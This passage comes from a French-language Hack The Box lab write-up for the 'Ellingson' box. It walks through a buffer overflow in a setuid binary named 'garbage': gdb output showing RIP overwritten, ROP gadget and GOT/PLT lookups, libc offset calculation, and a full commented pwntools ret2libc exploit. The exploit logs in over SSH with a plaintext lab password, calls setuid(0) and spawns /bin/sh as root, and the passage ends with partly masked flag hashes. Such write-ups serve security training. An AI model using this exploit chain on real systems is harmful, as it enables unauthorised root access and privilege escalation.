	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB
	```
	- Executer le programme
		- RIP est correctement remplis de B (0x42). Cela signifie que ce qui suivras les `A` se positionnera dans **RIP**
	```
	gdb-peda$ r
	Starting program: /mnt/hgfs/PARTAGE-VM/SHARED/TRAINING/HtB/Boxes/OnMyWay/Ellingson/garbage/garbage 
	Enter access password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB[----------------------------------registers-----------------------------------]
	RAX: 0x0 
	RBX: 0x0 
	RCX: 0x7ffff7ecd504 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
	RDX: 0x7ffff7fa08c0 --> 0x0 
	RSI: 0x406bb0 ("access denied.\nssword: ")
	RDI: 0x0 
	RBP: 0x4141414141414141 ('AAAAAAAA')
	RSP: 0x7fffffffde00 --> 0x7fffffffdef0 --> 0x1 
	RIP: 0x424242424242 ('BBBBBB')
	```

- **Etapes à suivres**

- Faire fuiter la localisation en mémoire de la fonction `puts` en utilisant la table **PLT** et un appel à `puts`
- En utilisant la fuite précédente, faire fuiter la localisation initiale de la libc, celle de la fonction `system`, `setuid` et de la chaine `/bin/sh` présent dans la libc
- Appeller la fonction main à nouveau pour recommencer dans le même contexte d'exécution
- Utiliser l'information ayant fuitée pour exécuter `system(“/bin/sh”)`

#### Etape 1

- Dump de gadget ROP
	- On choisis `pop rdi` car dans les appplications **64 bits** on ne positionne pas les arguments dans la stack mais dans les registres, dans l'ordre : `rdi`, `rsi`, `rdx`, `rcx`. Ici nous n'en avons besoin que d'un seul.

`ROPgadget --binary garbage |grep "pop rdi"`
```
0x000000000040179b : pop rdi ; ret
```

- On utilise `puts@PLT` pour appeller `puts@GOT` pour faire fuiter l'adresse de puts qui change à chaque fois que le programme redémarre

`objdump -D garbage |grep puts`
```
0000000000401050 <puts@plt>:
  401050:	ff 25 d2 2f 00 00    	jmpq   0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
```

- puts@GOT : 404028
- puts@PLT : 401050

 - On doit aussi ajouter l'adresse de la fonction `main` du binaire à la fin du payload, de façon à ce qu'aprés fait fuiter l'adresse mémoire il nous remaéne à un 2em input pour obtenir un shell

`objdump -D garbage | grep main`
```
401194:	ff 15 56 2e 00 00    	callq  *0x2e56(%rip)        # 403ff0 <__libc_start_main@GLIBC_2.2.5>
0000000000401619 <main>:
```

- @main : 401619

#### Etape 2

- Nous devons calculer l'offset entre l'adresse de la fonction puts et l'adresse fuité
	- Censé être la même chose, mais du fait de l'ASLR c'est différent
		- **offset = leaked_puts - lib_puts**

- On va recherche au sein de la libc les adresses de `puts`, `system`, `setuid` et `/bin/sh`
	- Bien utiliser la **même version de la libc**

`readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep puts@@GLIBC_2.2.5`
```
191: 00000000000809c0   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
422: 00000000000809c0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
```

`readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep system`
```
1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```

`readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep setuid`
```
23: 00000000000e5970   144 FUNC    WEAK   DEFAULT   13 setuid@@GLIBC_2.2.5
```

`strings -at x /lib/x86_64-linux-gnu/libc.so.6 |grep /bin/sh`
```
1b3e9a /bin/sh
```

#### Code final commenté

```python
# Utilisation du framework pwn
from pwn import *

# Lettre permettant de reecrire RSP
letters = "A"*136
# 1er parametre pour puts - recupere via ROPgadget
pop_rdi = p64(0x40179b)
# objdump -D garbage |grep puts
got_put = p64(0x404028)
# objdump -D garbage |grep puts
plt_put = p64(0x401050)
# objdump -D garbage | grep main
plt_main = p64(0x401619)

# Creation du payload
payload = letters + pop_rdi + got_put + plt_put + plt_main

# Ouverture du flux SSH
session = ssh('margo', '10.10.10.139', password='iamgod$08')
# Lancement du processus
io = session.process('/usr/bin/garbage')

# Envoie du premier payload
io.sendline(payload)
# Attends la break line
io.recvline() 
# Attends "access denied"
io.recvline() 

# Fuite l'adresse dans un format lisible
leaked_puts =  io.recvline().strip().ljust(8, "\x00")

#unpack again
leaked_puts = u64(leaked_puts)

# Specifique a la version de la libc, valeur prise sur elligson - readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep puts@@GLIBC_2.2.5
libc_put = 0x809c0      

# Calcul de l'offset : @debase_libc - @fonction_put_libc
offset = leaked_puts - libc_put

# Specifique a la version de la libc valeur prise sur elligson - readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep system
libc_sys = 0x4f440      
# Specifique a la version de la libc valeur prise sur elligson - readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep setuid
libc_setuid = 0xe5970
# Specifique a la version de la libc valeur prise sur elligson - strings -at x /lib/x86_64-linux-gnu/libc.so.6 |grep /bin/sh
libc_sh = 0x1b3e9a


# Recupere l'@ de sys
sys = p64(offset + libc_sys)
# Recupere l'@ de setuid
setuid = p64(offset + libc_setuid)
# Recupere l'@ de sh
sh = p64(offset + libc_sh)

# Il faut mettre setuid a 0 c'est pourquoi on integre p64(0x0)
payload = letters + pop_rdi +  p64(0x0) + setuid + pop_rdi + sh + sys

io.sendline(payload)
io.recvline()
io.recvline()

io.interactive(prompt="")
``` 

# Proof

- User : `d0ff9e3f9da8bb0XXXXXXXXXX3e45903`
- Root : `1cc73a448021ea8XXXXXXXXXX3d2f997`
